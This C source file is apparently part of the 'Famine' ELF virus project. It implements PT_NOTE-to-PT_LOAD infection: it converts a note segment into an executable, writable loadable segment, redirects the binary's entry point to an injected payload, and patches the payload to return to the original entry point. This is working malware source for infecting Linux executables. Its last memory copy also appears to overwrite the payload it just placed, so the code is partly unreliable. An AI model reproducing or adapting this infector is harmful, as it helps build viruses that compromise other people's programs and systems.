/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pt_note_to_pt_load_infection.c                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mabouce <ma.sithis@gmail.com>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/09/23 18:04:56 by mabouce           #+#    #+#             */
/*   Updated: 2021/09/23 18:04:56 by mabouce          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

void pt_note_to_pt_load_infection(t_famine *famine)
{
    bool p_data_found = false;
    bool p_note_found = false;

    if (DEBUG == true)
        printf("Applying pt_note_to_pt_load infection.\n");
    // Create the output file
    if (!(famine->infected_file = malloc(famine->binary_data_size + famine->payload_size)))
    {
        error(ERROR_MALLOC, famine);
    }
    famine->infected_file_size = famine->binary_data_size + famine->payload_size;
    for (size_t i = 0; i < famine->ehdr->e_phnum; i++)
    {
        if (is_data_segment(famine->phdr[i]) == true)
        {
            p_data_found = true;
            famine->p_data = famine->phdr[i];
            famine->p_data_end_offset = famine->p_data.p_offset + famine->p_data.p_filesz;
        }
        if (is_note_segment(famine->phdr[i]) == true && !p_note_found)
        {
            p_note_found = true;
            const size_t base = famine->p_data.p_vaddr + famine->p_data.p_memsz;
            const size_t add_padding = base % famine->p_data.p_align;

            famine->phdr[i].p_vaddr = base + (famine->p_data.p_align - add_padding);
            famine->phdr[i].p_paddr = famine->phdr[i].p_vaddr;
            famine->phdr[i].p_offset = base - add_padding;

            famine->phdr[i].p_filesz = famine->payload_size;
            famine->phdr[i].p_memsz = famine->payload_size;

            famine->phdr[i].p_type = PT_LOAD;
            famine->phdr[i].p_flags = (PF_X | PF_W | PF_R);
            famine->phdr[i].p_align = famine->p_data.p_align;

            famine->ehdr->e_entry = famine->phdr[i].p_vaddr;
            famine->new_entry_point = famine->ehdr->e_entry;

            famine->ehdr->e_shoff += famine->payload_size + (famine->phdr[i].p_offset - (famine->p_data_end_offset));
        }
    }

    if (!p_note_found || !p_data_found)
    {
        error(ERROR_SECTION_NOT_FOUND, famine);
    }

    // cipher_famine_file_data(famine);
    if (famine->elf_32)
    {
        overwrite_payload_ret2oep(famine);
    }
    else if (famine->elf_64)
    {
        overwrite_payload_ret2oep(famine);
        // overwrite_keysection_payload(famine);
        // overwrite_payload_getencryptedsectionaddr(famine);
        // overwrite_payload_getencryptedsectionsize(famine);
        // overwrite_payload_gettextsectionaddr(famine);
        // overwrite_payload_gettextsize(famine);
    }

    // Copy until end of data segment.
    memcpy(famine->infected_file, famine->mmap_ptr, famine->p_data_end_offset);
    // Copy payload.
    memcpy(famine->infected_file + famine->p_data_end_offset, famine->payload_data, famine->payload_size);
    memcpy(famine->infected_file + famine->p_data_end_offset, famine->mmap_ptr + famine->p_data_end_offset, famine->binary_data_size - famine->p_data_end_offset);
}
